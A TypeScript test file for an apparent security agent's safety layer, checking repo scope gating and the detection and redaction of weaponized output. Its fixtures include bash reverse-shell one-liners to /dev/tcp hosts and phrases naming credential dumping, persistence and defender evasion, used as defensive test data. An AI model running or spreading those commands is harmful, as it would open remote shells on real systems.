// SPDX-License-Identifier: MIT
//
// Darwin Shield safety layer (ADR-155 §safety controls). The security-critical
// tests: scope gating, exploit redaction, and the unsafe-output gate that keeps
// the acceptance counter at 0. This is the boundary an attacker (or a regressed
// agent) would have to cross to emit weaponized content; it must not move.

import { describe, expect, it } from 'vitest';
import {
  assertScope,
  detectUnsafe,
  gateFinding,
  gateOutputs,
  isSafeOutput,
  redactUnsafeOutput,
  requireScope,
} from '../../src/security/policy.js';
import type { Finding } from '../../src/security/types.js';

function finding(overrides: Partial<Finding> = {}): Finding {
  return {
    id: 'f1',
    repo: 'corpus/ts/web-api',
    commit: 'e4f5a6b',
    file: 'src/query.ts',
    symbol: 'buildQuery',
    weakness: 'CWE-89 SQL injection',
    confidence: 0.9,
    evidence: ['user input reaches the query builder unsanitized'],
    patch: 'use a parameterized query',
    test: 'assert buildQuery rejects a quote-injection input',
    verdict: 'confirmed',
    exploitCodeAllowed: false,
    ...overrides,
  };
}

describe('assertScope — only owned/authorized repos may be scanned', () => {
  it('accepts an owned repo', () => {
    expect(assertScope({ repo: 'me/app', scope: 'owned' }).ok).toBe(true);
  });
  it('rejects an authorized repo without an attestation', () => {
    const r = assertScope({ repo: 'them/app', scope: 'authorized' });
    expect(r.ok).toBe(false);
    expect(r.reason).toMatch(/attestation/);
  });
  it('accepts an authorized repo with an attestation', () => {
    expect(assertScope({ repo: 'them/app', scope: 'authorized', authorization: 'PT-123' }).ok).toBe(true);
  });
  it('rejects an empty repo', () => {
    expect(assertScope({ repo: '', scope: 'owned' }).ok).toBe(false);
  });
  it('requireScope throws on an invalid scope', () => {
    expect(() => requireScope({ repo: 'them/app', scope: 'authorized' })).toThrow(/scope gate/);
    expect(() => requireScope({ repo: 'me/app', scope: 'owned' })).not.toThrow();
  });
});

describe('detectUnsafe — flags weaponized content', () => {
  const payloads = [
    'spawn a reverse shell to the attacker',
    'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
    'generate an exploit payload chain',
    'install a persistence mechanism via crontab -e',
    'this is a keylogger and rootkit',
    'use mimikatz to dump credentials',
    '-----BEGIN RSA PRIVATE KEY-----',
    'AMSI bypass for defender evasion',
  ];
  for (const p of payloads) {
    it(`flags: ${p.slice(0, 32)}…`, () => {
      expect(detectUnsafe(p).length).toBeGreaterThan(0);
      expect(isSafeOutput(p)).toBe(false);
    });
  }

  it('passes a normal defensive advisory', () => {
    const safe = 'SQL injection at buildQuery; use parameterized queries and add a regression test.';
    expect(detectUnsafe(safe)).toEqual([]);
    expect(isSafeOutput(safe)).toBe(true);
  });
});

describe('redactUnsafeOutput — strips payloads but keeps the prose', () => {
  it('replaces the payload with a marker and reports the reason', () => {
    const { safe, reasons } = redactUnsafeOutput('here is a reverse shell you can run');
    expect(safe).toContain('[REDACTED:unsafe-content]');
    expect(safe).not.toMatch(/reverse shell/i);
    expect(reasons).toContain('remote shell payload');
  });
  it('is a no-op on already-safe text', () => {
    const text = 'apply input validation';
    expect(redactUnsafeOutput(text)).toEqual({ safe: text, reasons: [] });
  });
});

describe('gateFinding — the per-finding output gate', () => {
  it('passes a clean confirmed finding unchanged in substance', () => {
    const g = gateFinding(finding());
    expect(g.unsafe).toBe(false);
    expect(g.finding).not.toBeNull();
    expect(g.finding!.weakness).toBe('CWE-89 SQL injection');
  });

  it('redacts unsafe evidence and marks the finding unsafe', () => {
    const g = gateFinding(finding({ evidence: ['PoC: bash -i >& /dev/tcp/1.2.3.4/9001 0>&1'] }));
    expect(g.unsafe).toBe(true);
    expect(g.finding!.evidence[0]).toContain('[REDACTED:unsafe-content]');
  });

  it('drops a finding that (impossibly) authorizes exploit code', () => {
    const bad = { ...finding(), exploitCodeAllowed: true } as unknown as Finding;
    const g = gateFinding(bad);
    expect(g.finding).toBeNull();
    expect(g.unsafe).toBe(true);
    expect(g.reasons).toContain('exploitCodeAllowed must be false');
  });
});

describe('gateOutputs — the run-level acceptance counter', () => {
  it('reports zero unsafe outputs for a clean run', () => {
    const g = gateOutputs([finding(), finding({ id: 'f2', symbol: 'renderTemplate' })]);
    expect(g.unsafeOutputs).toBe(0);
    expect(g.safe).toHaveLength(2);
  });

  it('counts each finding that carried unsafe content', () => {
    const g = gateOutputs([
      finding(),
      finding({ id: 'f2', patch: 'drop a meterpreter dropper for persistence' }),
    ]);
    expect(g.unsafeOutputs).toBe(1);
    // The sanitized finding is still returned (we keep the location, drop the payload).
    expect(g.safe).toHaveLength(2);
    expect(g.safe[1].patch).toContain('[REDACTED:unsafe-content]');
  });
});
